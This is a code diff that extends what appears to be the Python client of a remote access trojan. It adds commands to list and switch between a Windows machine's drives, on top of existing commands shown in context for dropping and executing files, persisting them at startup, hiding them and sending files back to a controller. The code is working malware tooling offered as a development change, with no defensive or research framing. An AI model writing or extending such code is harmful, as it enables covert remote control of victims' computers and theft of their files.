@@ -3,6 +3,8 @@ from subprocess import check_output, CalledProcessError
 from pickle import dumps
 from os import getlogin, getenv, startfile, system, chdir, getcwd
 from sys import exit
+from ctypes import windll
+from string import ascii_uppercase
 
 
 class Socket:
@@ -54,10 +56,28 @@ class Socket:
             drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
             return
 
+        # Download file
+
         elif "-download" in cmd:
             path = cmd[10:]
             self.download_file(path)
             return
+
+        # Get and change to logical drives
+
+        elif "-drives" in cmd:
+            self.send_msg(self.get_drives())
+
+        elif "-cdrive" in cmd:
+            for drive in self.get_drives():
+                if drive == cmd[9:11]:
+                    try:
+                        chdir(drive)
+                    except (PermissionError, FileNotFoundError)as error:
+                        self.send_msg(error)
+                        return
+                    self.send_msg(getcwd())
+                    return
 
         # Change working directory stuff
 
@@ -100,6 +120,9 @@ class Socket:
         except(ConnectionResetError, ConnectionAbortedError, OSError):
             self.established = False
 
+    def ping_response(self):
+        pass
+
     def download_file(self, path):
         try:
             file = open(path, "rb")
@@ -120,6 +143,16 @@ class Socket:
             if switch:
                 new_path += char
         return new_path[::-1]
+
+    @staticmethod
+    def get_drives():
+        drives = []
+        bit_mask = windll.kernel32.GetLogicalDrives()
+        for letter in ascii_uppercase:
+            if bit_mask & 1:
+                drives.append(letter + ":")
+            bit_mask >>= 1
+        return drives
 
 
 def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
@@ -163,5 +196,6 @@ while True:
 
 
 # Change hard drives
+# Ping Methode dass nach jedem command irgendein Output kommt
 
 
